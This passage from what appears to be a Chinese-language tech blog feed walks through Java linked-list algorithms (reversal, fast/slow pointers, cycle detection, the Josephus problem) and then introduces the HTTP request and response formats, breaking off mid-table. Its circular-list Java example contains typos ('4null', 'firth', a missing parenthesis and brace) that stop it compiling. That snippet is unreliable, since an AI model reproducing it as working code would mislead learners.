<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 用来反转整个链表</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">reverse</span><span class="params">()</span>&#123;</span><br><span class="line">	<span class="comment">// 判断当前链表是否为空链表，如果是空链表，则结束运行，如果不是，则调用重载的reverse方法完成反转</span></span><br><span class="line">	<span class="keyword">if</span> (isEmpty())</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	reverse(head.next);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 反转指定的结点 curr，并把反转后的结点返回</span></span><br><span class="line"><span class="keyword">public</span> Node <span class="title function_">reverse</span><span class="params">(Node curr)</span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (curr.next == <span class="literal">null</span>)&#123;</span><br><span class="line">		head.next = curr;</span><br><span class="line">		<span class="keyword">return</span> curr;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// 递归的反转当前结点curr的下一个结点；返回值就是链表反转后，当前结点的上一个结点</span></span><br><span class="line">	<span class="type">Node</span> <span class="variable">pre</span> <span class="operator">=</span> reverse(curr.next);</span><br><span class="line">	<span class="comment">// 让返回的结点的下一个结点变为当前结点curr；</span></span><br><span class="line">	pre.next = curr;</span><br><span class="line">	<span class="comment">// 把当前结点的下一个结点变为null</span></span><br><span class="line">	curr.next = <span class="literal">null</span>;</span><br><span class="line">	<span class="keyword">return</span> curr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>个人感觉最好理解的还是使用栈以及头插法最容易理解，三指法是性能最佳的，递归是最难理解的。</p>
<h2 id="4-快慢指针问题"><a href="#4-快慢指针问题" class="headerlink" title="4. 快慢指针问题"></a>4. 快慢指针问题</h2><p>快慢指针指的是定义两个指针，这两个指针的移动速度一快一慢，以此来制造出自己想要的差值，这个差值可以让我们找到链表上相应的结点。一般情况下，快指针的移动步长为慢指针的两倍。</p>
<h3 id="①-中间值问题"><a href="#①-中间值问题" class="headerlink" title="① 中间值问题"></a>① 中间值问题</h3><p>利用快慢指针，我们把一个链表看成一个跑道，假设a的速度是b的两倍，那么当a跑完全程后，b刚好跑一半，依次来达到找到中间结点的目的。<br>如下图：最开始，slow和fast指针都指向链表的第一个结点，然后slow每次移动一个指针，fast每次移动两个指针<br><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815143100.png" alt="  "></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FastSlowTest</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// 创建结点</span></span><br><span class="line">        Node&lt;String&gt; first = <span class="keyword">new</span> <span class="title class_">Node</span>&lt;String&gt;(<span class="string">&quot;aa&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">        Node&lt;String&gt; second = <span class="keyword">new</span> <span class="title class_">Node</span>&lt;String&gt;(<span class="string">&quot;bb&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">        Node&lt;String&gt; third = <span class="keyword">new</span> <span class="title class_">Node</span>&lt;String&gt;(<span class="string">&quot;cc&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">        Node&lt;String&gt; fourth = <span class="keyword">new</span> <span class="title class_">Node</span>&lt;String&gt;(<span class="string">&quot;dd&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">        Node&lt;String&gt; fifth = <span class="keyword">new</span> <span class="title class_">Node</span>&lt;String&gt;(<span class="string">&quot;ee&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">        Node&lt;String&gt; six = <span class="keyword">new</span> <span class="title class_">Node</span>&lt;String&gt;(<span class="string">&quot;ff&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">        Node&lt;String&gt; seven = <span class="keyword">new</span> <span class="title class_">Node</span>&lt;String&gt;(<span class="string">&quot;gg&quot;</span>, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 完成结点之间的指向</span></span><br><span class="line">        first.next = second;</span><br><span class="line">        second.next = third;</span><br><span class="line">        third.next = fourth;</span><br><span class="line">        fourth.next = fifth;</span><br><span class="line">        fifth.next = six;</span><br><span class="line">        six.next = seven;</span><br><span class="line">        <span class="comment">// 查找中间值</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">mid</span> <span class="operator">=</span> getMid(first);</span><br><span class="line">        System.out.println(<span class="string">&quot;中间值为：&quot;</span>+mid);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> first 链表的首结点</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> 链表的中间结点的值</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">getMid</span><span class="params">(Node&lt;String&gt; first)</span> &#123;</span><br><span class="line">        <span class="comment">// 定义快慢指针</span></span><br><span class="line">        Node&lt;String&gt; fast = first;</span><br><span class="line">        Node&lt;String&gt; slow = first;</span><br><span class="line">        <span class="comment">//使用两个指针遍历链表，当快指针指向的结点没有下一个结点了，就可以结束了，结束之后，慢指针指向的结点就是中间值</span></span><br><span class="line">        <span class="keyword">while</span>(fast != <span class="literal">null</span> &amp;&amp; fast.next != <span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="comment">// 变化fast的值和slow的值</span></span><br><span class="line">            fast = fast.next.next;</span><br><span class="line">            slow = slow.next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> slow.item;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 结点类</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">Node</span>&lt;T&gt; &#123;</span><br><span class="line">        <span class="comment">// 存储数据</span></span><br><span class="line">        T item;</span><br><span class="line">        <span class="comment">// 下一个结点</span></span><br><span class="line">        Node next;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">Node</span><span class="params">(T item, Node next)</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.item = item;</span><br><span class="line">            <span class="built_in">this</span>.next = next;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<h3 id="②-判断单向链表是否有环"><a href="#②-判断单向链表是否有环" class="headerlink" title="② 判断单向链表是否有环"></a>② 判断单向链表是否有环</h3><p>使用快慢指针的思想，还是把链表比作一条跑道，链表中有环，那么这条跑道就是一条圆环跑道，在一条圆环跑道中，两个人有速度差，那么迟早两个人会相遇，只要相遇那么就说明有环。<br><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815143106.png" alt="  "></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CircleListCheckTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// 创建结点</span></span><br><span class="line">        Node&lt;String&gt; first = <span class="keyword">new</span> <span class="title class_">Node</span>&lt;String&gt;(<span class="string">&quot;aa&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">        Node&lt;String&gt; second = <span class="keyword">new</span> <span class="title class_">Node</span>&lt;String&gt;(<span class="string">&quot;bb&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">        Node&lt;String&gt; third = <span class="keyword">new</span> <span class="title class_">Node</span>&lt;String&gt;(<span class="string">&quot;cc&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">        Node&lt;String&gt; fourth = <span class="keyword">new</span> <span class="title class_">Node</span>&lt;String&gt;(<span class="string">&quot;dd&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">        Node&lt;String&gt; fifth = <span class="keyword">new</span> <span class="title class_">Node</span>&lt;String&gt;(<span class="string">&quot;ee&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">        Node&lt;String&gt; six = <span class="keyword">new</span> <span class="title class_">Node</span>&lt;String&gt;(<span class="string">&quot;ff&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">        Node&lt;String&gt; seven = <span class="keyword">new</span> <span class="title class_">Node</span>&lt;String&gt;(<span class="string">&quot;gg&quot;</span>, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 完成结点之间的指向</span></span><br><span class="line">        first.next = second;</span><br><span class="line">        second.next = third;</span><br><span class="line">        third.next = fourth;</span><br><span class="line">        fourth.next = fifth;</span><br><span class="line">        fifth.next = six;</span><br><span class="line">        six.next = seven;</span><br><span class="line">        <span class="comment">// 产生环</span></span><br><span class="line">        seven.next = third;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 判断链表是否有环</span></span><br><span class="line">        <span class="type">boolean</span> <span class="variable">circle</span> <span class="operator">=</span> isCircle(first);</span><br><span class="line">        System.out.println(<span class="string">&quot;first链表中是否有环：&quot;</span> + circle);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 判断链表中是否有环</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> first 链表首结点</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> ture为有环，false为无环</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">isCircle</span><span class="params">(Node&lt;String&gt; first)</span> &#123;</span><br><span class="line">        <span class="comment">// 定义快慢指针</span></span><br><span class="line">        Node&lt;String&gt; fast = first;</span><br><span class="line">        Node&lt;String&gt; slow = first;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 遍历链表，如果快慢指针指向了同一个结点，那么证明有环</span></span><br><span class="line">        <span class="keyword">while</span>(fast != <span class="literal">null</span> &amp;&amp; fast.next != <span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="comment">// 变换fast和slow</span></span><br><span class="line">            fast = fast.next.next;</span><br><span class="line">            slow = slow.next;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (fast.equals(slow))&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 结点类</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">Node</span>&lt;T&gt; &#123;</span><br><span class="line">        <span class="comment">// 存储数据</span></span><br><span class="line">        T item;</span><br><span class="line">        <span class="comment">// 下一个结点</span></span><br><span class="line">        Node next;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">Node</span><span class="params">(T item, Node next)</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.item = item;</span><br><span class="line">            <span class="built_in">this</span>.next = next;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<h2 id="5-循环链表问题"><a href="#5-循环链表问题" class="headerlink" title="5. 循环链表问题"></a>5. 循环链表问题</h2><p>循环链表，顾名思义，链表整体要形成一个圆环状，在单向链表中，最后一个结点的指针为null，不指向任何结点，因为没有下一个元素了。要实现循环链表，我们只需要让单向链表的最后一个结点的指针指向头结点即可。</p>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815143110.png" alt="  "></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">		<span class="comment">// 构建节点</span></span><br><span class="line">		Node&lt;Integer&gt; first = <span class="keyword">new</span> <span class="title class_">Node</span>&lt;Integer&gt;(<span class="number">1</span>,<span class="literal">null</span>);</span><br><span class="line">		Node&lt;Integer&gt; second = <span class="keyword">new</span> <span class="title class_">Node</span>&lt;Integer&gt;(<span class="number">2</span>,<span class="literal">null</span>);</span><br><span class="line">		Node&lt;Integer&gt; third = <span class="keyword">new</span> <span class="title class_">Node</span>&lt;Integer&gt;(<span class="number">3</span>,<span class="literal">null</span>);</span><br><span class="line">		Node&lt;Integer&gt; fourth = <span class="keyword">new</span> <span class="title class_">Node</span>&lt;Integer&gt;(4null);</span><br><span class="line">		Node&lt;Integer&gt; fifth = <span class="keyword">new</span> <span class="title class_">Node</span>&lt;Integer&gt;(5null;</span><br><span class="line">		Node&lt;Integer&gt; sixth = <span class="keyword">new</span> <span class="title class_">Node</span>&lt;Integer&gt;(6null);</span><br><span class="line">		Node&lt;Integer&gt; seventh = <span class="keyword">new</span> <span class="title class_">Node</span>&lt;Integer&gt;(7null);</span><br><span class="line">		                                </span><br><span class="line">		<span class="comment">// 构建单链表</span></span><br><span class="line">		first.next = second;</span><br><span class="line">		second.next = third;</span><br><span class="line">		third.next = fourth;</span><br><span class="line">		fourth.next = fifth;</span><br><span class="line">		fifth.next = sixth;</span><br><span class="line">		sixth.next = seventh;</span><br><span class="line">		                                </span><br><span class="line">		<span class="comment">// 构建循环链表，让最后一个结点指向第一个结点</span></span><br><span class="line">		seventh.next = firth;        </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="①-约瑟夫问题"><a href="#①-约瑟夫问题" class="headerlink" title="① 约瑟夫问题"></a>① 约瑟夫问题</h3><p>已知 n 个人（以编号 1，2，3，…，n 分别表示）围坐在一张圆桌周围，从编号为 k 的人开始顺时针报数，数到 m 的那个人出列；他的下一个人又从 1 还是顺时针开始报数，数到 m 的那个人又出列；依次重复下去，要求找到最后出列的那个人?</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JosephTest</span> &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 解决约瑟夫问题</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> peopleCount 人总数</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> start  从谁开始 取值范围 [1, peopleCount]</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> m  报数报到几</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> 最后出列的人的号数 取值范围 [1, peopleCount]</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> <span class="title function_">josephSolve</span><span class="params">(<span class="type">int</span> peopleCount, <span class="type">int</span> start, <span class="type">int</span> m)</span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 构建循环链表，包含 peopleCount 个结点，分别存储 1 ~ peopleCount 之间的值</span></span><br><span class="line">        <span class="comment">// 用来记录头结点</span></span><br><span class="line">        <span class="type">Node</span> <span class="variable">head</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="comment">// 使用尾插法建立循环链表</span></span><br><span class="line">        <span class="type">Node</span> <span class="variable">tail</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt;= peopleCount; i++)&#123;</span><br><span class="line">            <span class="comment">// 如果是第一个结点</span></span><br><span class="line">            <span class="keyword">if</span> (i == <span class="number">1</span>)&#123;</span><br><span class="line">                head = <span class="keyword">new</span> <span class="title class_">Node</span>&lt;&gt;(i,<span class="literal">null</span>);</span><br><span class="line">                tail = head;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 如果不是第一个结点</span></span><br><span class="line">            <span class="type">Node</span> <span class="variable">newNode</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Node</span>&lt;&gt;(i, <span class="literal">null</span>);</span><br><span class="line">            tail.next = newNode;</span><br><span class="line">            tail = newNode;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 建立循环</span></span><br><span class="line">        tail.next = head;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 记录每次遍历拿到的结点，从第 start 个人开始</span></span><br><span class="line">        Node&lt;Integer&gt; node = head;</span><br><span class="line">        <span class="keyword">while</span> (-- start &gt; <span class="number">0</span>)&#123;</span><br><span class="line">            node = node.next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// count计数器，模拟报数</span></span><br><span class="line">        <span class="type">int</span> count=<span class="number">0</span>;</span><br><span class="line">        <span class="comment">// 记录当前结点的上一个结点</span></span><br><span class="line">        <span class="comment">// 遍历循环链表</span></span><br><span class="line">        Node&lt;Integer&gt; last = <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">while</span>(node != node.next)&#123;</span><br><span class="line">            <span class="comment">// 模拟报数</span></span><br><span class="line">            count ++;</span><br><span class="line">            <span class="keyword">if</span> (count == m)&#123;</span><br><span class="line">                <span class="comment">// 如果是 m ，则把当前结点删除调用，打印当前结点，重置 count=0，让当前结点node后移</span></span><br><span class="line">                last.next = node.next;</span><br><span class="line">                System.out.print(node.item + <span class="string">&quot;,&quot;</span>);</span><br><span class="line">                count = <span class="number">0</span>;</span><br><span class="line">                node = node.next;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="comment">//如果不是m，让last变为当前结点，让当前结点后移；</span></span><br><span class="line">                last = node;</span><br><span class="line">                node = node.next;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> node.item;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">k</span> <span class="operator">=</span> josephSolve(<span class="number">5</span>, <span class="number">2</span>,<span class="number">3</span>);</span><br><span class="line">        <span class="comment">//打印最后一个元素</span></span><br><span class="line">        System.out.println(<span class="string">&quot;\n\n 最后出列的人为： &quot;</span> + k);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 结点类</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">Node</span>&lt;T&gt; &#123;</span><br><span class="line">        <span class="comment">// 存储数据</span></span><br><span class="line">        T item;</span><br><span class="line">        <span class="comment">// 下一个结点</span></span><br><span class="line">        Node next;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">Node</span><span class="params">(T item, Node next)</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.item = item;</span><br><span class="line">            <span class="built_in">this</span>.next = next;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<hr>
]]></content>
      <categories>
        <category>技术笔记</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>数据结构</tag>
      </tags>
  </entry>
  <entry>
    <title>HTTP协议基本介绍</title>
    <url>/posts/917a39c3.html</url>
    <content><![CDATA[<h1 id="一、-HTTP说明"><a href="#一、-HTTP说明" class="headerlink" title="一、 HTTP说明"></a>一、 HTTP说明</h1><h2 id="1-HTTP简介"><a href="#1-HTTP简介" class="headerlink" title="1.HTTP简介"></a>1.HTTP简介</h2><ul>
<li>概念：&#x3D;&#x3D;H&#x3D;&#x3D;yper&#x3D;&#x3D;T&#x3D;&#x3D;ext &#x3D;&#x3D;T&#x3D;&#x3D;ransfer &#x3D;&#x3D;P&#x3D;&#x3D;rotocol，超文本传输协议，规定了浏览器与服务器之间&#x3D;&#x3D;数据传输的规则&#x3D;&#x3D;。</li>
<li>特点：<ol>
<li>基于TCP协议：面向连接，安全</li>
<li>基于请求-响应模型：一次请求对应一次响应</li>
<li>HTTP协议是无状态的协议：对于事务处理没有记忆能力。每次请求-响应都是独立的。</li>
</ol>
</li>
<li>缺点：多次请求间无法共享数据（使用会话技术cookie、session解决这个问题）</li>
<li>优点：简单快速、灵活</li>
</ul>
<h2 id="2-HTTP请求方法"><a href="#2-HTTP请求方法" class="headerlink" title="2.HTTP请求方法"></a>2.HTTP请求方法</h2><blockquote>
<p>根据HTTP标准，HTTP请求可以使用多种请求方法。<br>&#x3D;&#x3D;HTTP1.0&#x3D;&#x3D;定义了三种请求方法： <code>GET</code>, <code>POST</code> 和 <code>HEAD</code>方法。<br>&#x3D;&#x3D;HTTP1.1&#x3D;&#x3D;新增了五种请求方法：<code>OPTIONS</code>, <code>PUT</code>, <code>DELETE</code>, <code>TRACE</code> 和 <code>CONNECT</code> 方法。</p>
<h2 id="3-HTTP工作原理"><a href="#3-HTTP工作原理" class="headerlink" title="3.HTTP工作原理"></a>3.HTTP工作原理</h2><p>HTTP协议基于客户&#x2F;服务器模式，且面向连接。典型的HTTP事务处理包含如下过程。<br>以下是 HTTP 请求&#x2F;响应的步骤：</p>
</blockquote>
<blockquote>
<p><strong>&#x3D;&#x3D;1、客户端与服务器建立连接&#x3D;&#x3D;</strong><br>一个HTTP客户端，通常是浏览器，与Web服务器的HTTP端口（默认为80）建立一个TCP套接字连接。</p>
</blockquote>
<blockquote>
<p><strong>&#x3D;&#x3D;2、客户向服务器发送HTTP请求&#x3D;&#x3D;</strong><br>通过TCP套接字，客户端向Web服务器发送一个文本的请求报文，一个请求报文由请求行、请求头、空行和请求体4部分组成。</p>
</blockquote>
<blockquote>
<p><strong>&#x3D;&#x3D;3、服务器接受请求并返回HTTP响应&#x3D;&#x3D;</strong><br>Web服务器解析请求，定位请求资源。服务器将资源复本写到TCP套接字，由客户端读取。一个响应由响应行、响应头、空行和响应体4部分组成。</p>
</blockquote>
<blockquote>
<p><strong>&#x3D;&#x3D;4、客户与服务器关闭连接&#x3D;&#x3D;</strong><br>若connection 模式为close，则服务器主动关闭TCP连接，客户端被动关闭连接，释放TCP连接;若connection 模式为keepalive，则该连接会保持一段时间，在该时间内可以继续接收请求;</p>
</blockquote>
<h1 id="二、-HTTP请求数据格式"><a href="#二、-HTTP请求数据格式" class="headerlink" title="二、 HTTP请求数据格式"></a>二、 HTTP请求数据格式</h1><p>HTTP请求由三部分组成，分别是：&#x3D;&#x3D;请求行、请求头（请求报头）、请求体（请求正文）&#x3D;&#x3D;。</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line">请求行</span><br><span class="line">请求头<span class="number">1</span></span><br><span class="line">请求头<span class="number">2</span></span><br><span class="line">...</span><br><span class="line">请求空行</span><br><span class="line">请求体</span><br></pre></td></tr></table></figure>

<h2 id="1-请求行"><a href="#1-请求行" class="headerlink" title="1.请求行"></a>1.请求行</h2><blockquote>
<p><strong>1. 请求行</strong>：请求数据的第一行。格式如下：<br><code>method request-URI HTTP-Version</code><br>其中<code>method </code> 代表请求方式，<code>request-URI</code> 代表请求统一资源表示符，<code>HTTP-Version</code> 代表协议版本。如下图：<img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815162915.png"> 对于此请求行，<code>GET</code> 代表请求方式，<code>/</code> 代表请求统一资源表示符，<code>HTTP/1.1</code> 代表协议版本。</p>
</blockquote>
<hr>
<h2 id="2-请求头"><a href="#2-请求头" class="headerlink" title="2.请求头"></a>2.请求头</h2><blockquote>
<p><strong>2. 请求头</strong>：在请求行的下一行，格式为key：value形式<br>HTTP常见请求头：</p>
</blockquote>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">Content-Type: 数据类型(text/html等)</span><br><span class="line">Content-Length: Body的长度</span><br><span class="line">Host: 客户端告知服务器, 所请求的资源是在哪个主机的哪个端口上;</span><br><span class="line">User-Agent: 声明用户的操作系统和浏览器版本信息;</span><br><span class="line">referer: 当前页面是从哪个页面跳转过来的;</span><br><span class="line">location: 搭配3xx状态码使用, 告诉客户端接下来要去哪里访问;</span><br><span class="line">Cookie: 用于在客户端存储少量信息. 通常用于实现会话(session)的功能.</span><br></pre></td></tr></table></figure>

<blockquote>
<p>如下图： <img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815162915.png"></p>
</blockquote>
<hr>
<h2 id="3-请求体"><a href="#3-请求体" class="headerlink" title="3.请求体"></a>3.请求体</h2><blockquote>
<p><strong>3. 请求体</strong>：POST请求的最后一部分，存放请求参数</p>
</blockquote>
<ul>
<li>GET与POST请求区别</li>
</ul>
<ol>
<li>GET请求的请求参数在请求行中，没有请求体。POST的请求的请求参数在请求体中。</li>
<li>GET请求的请求参数大小有限制，POST没有。</li>
</ol>
<blockquote>
<ul>
<li><p>GET和POST的区别      </p>
<p>   ①GET请求的请求参数会放在请求行中、URL之后，以?分割URL和传输数据，参数之间以&amp;相连，如csdn.net&#x2F;md?name&#x3D;test1&amp;id&#x3D;123。POST的请求的请求参数在请求体中。</p>
<p>   ②GET提交的数据大小有限制（因为浏览器对URL的长度有限制），而POST方法提交的数据没有限制.</p>
<p>   ③GET方式需要使用Request.QueryString来取得变量的值，而POST方式通过Request.Form来获取变量的值。</p>
<p>   ④GET方式提交数据，会带来安全问题，比如一个登录页面，通过GET方式提交数据时，用户名和密码将出现在URL上，如果页面可以被缓存或者其他人可以访问这台机器，就可以从历史记录获得该用户的账号和密码.</p>
</li>
</ul>
</blockquote>
<h1 id="三、-HTTP响应数据格式"><a href="#三、-HTTP响应数据格式" class="headerlink" title="三、 HTTP响应数据格式"></a>三、 HTTP响应数据格式</h1><p>在接受和解释请求消息后，服务器返回一个HTTP响应信息。HTTP响应也是由三部分组成，分别是：&#x3D;&#x3D;响应行、响应头、响应体。&#x3D;&#x3D;</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">响应行</span><br><span class="line">响应头1</span><br><span class="line">响应头2</span><br><span class="line">...</span><br><span class="line">响应空行</span><br><span class="line">响应体</span><br></pre></td></tr></table></figure>
<h2 id="1-响应行"><a href="#1-响应行" class="headerlink" title="1.响应行"></a>1.响应行</h2><blockquote>
<p><strong>1. 响应行</strong>：响应数据的第一行。格式如下：<br><code>HTTP-Version status-code status-phrase</code><br>其中<code>HTTP-Version</code>代表协议版本，<code>status-code </code>代表响应状态码，<code>status-phrase</code>代表状态描述。如下图：<img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815162915.png"><br>对于此响应行，<code>HTTP/1.1</code> 代表协议版本，<code>200</code>代表响应状态码，<code>OK</code>表示状态码描述。</p>
</blockquote>
<h2 id="2-响应头"><a href="#2-响应头" class="headerlink" title="2.响应头"></a>2.响应头</h2><blockquote>
<p><strong>2. 响应头</strong>：在响应行的下一行，格式为key：value形式 HTTP常见响应头</p>
</blockquote>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">Content-Type：表示被响应内容的类型，例如text/html，image/jpeg</span><br><span class="line">Content-Length：表示被响应内容的长度（字节数）</span><br><span class="line">Content-Encoding：表示该响应压缩方式，例如gzip</span><br><span class="line">Cache-Control：指示客户端如何缓存，例如max-age=300表示最多可以缓存300秒</span><br></pre></td></tr></table></figure>

<blockquote>
<p>如下图：<br><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815162915.png"></p>
</blockquote>
<h2 id="3-响应体"><a href="#3-响应体" class="headerlink" title="3.响应体"></a>3.响应体</h2><blockquote>
<p><strong>3. 响应体</strong>：最后一部分，存放响应数据</p>
</blockquote>
<h1 id="四、HTTP之状态码"><a href="#四、HTTP之状态码" class="headerlink" title="四、HTTP之状态码"></a>四、HTTP之状态码</h1><p>状态码由3位数字组成，第一个数字定义了响应类别，共5大类：</p>
<table>
<thead>
<tr>
<th>状态码分类</th>
<th align="left">说明</th>
</tr>
</thead>
<tbody><tr>
<td>1xx</td>
<td align="left"><strong>响应中</strong>–临时状态码，表示请求已接收，继续处理</td>
</tr>
<tr>
<td>2xx</td>
<td align="left"><strong>成功</strong>–表示请求已被成功接收并处理完成</td>
</tr>
<tr>
<td>3xx</td>
<td align="left"><strong>重定向</strong>–让客户端再次发起一个请求以完成处理</td>
</tr>
<tr>
<td>4xx</td>
<td align="left"><strong>客户端错误</strong>–请求有语法错误或请求无法实现</td>
</tr>
<tr>
<td>5xx</td>
<td align="left"><strong>服务器端错误</strong>–服务器未能实现合法的请求</td>
</tr>
</tbody></table>
<p><strong>常见状态码</strong></p>
<table>
<thead>
<tr>
<th>状态码</th>
<th>状态码描述</th>
<th align="left">解释</th>
</tr>
</thead>
<tbody><tr>
<td>200</td>
<td><b>OK</td>
<td align="left">请求已正常处理</td>
</tr>
<tr>
<td>302</td>
<td><b>Found</td>
<td align="left">指示锁清秋的资源已移动到由Location响应头给你的那个的URL，浏览器自动重新访问这个页面</td>
</tr>
<tr>
<td>304</td>
<td><b>Not Modified</td>
<td align="left">隐式重定向，告知客户端所请求的资源至上次取得后服务器并未改变，直接使用本地缓存即可</td>
</tr>
<tr>
<td>400</td>
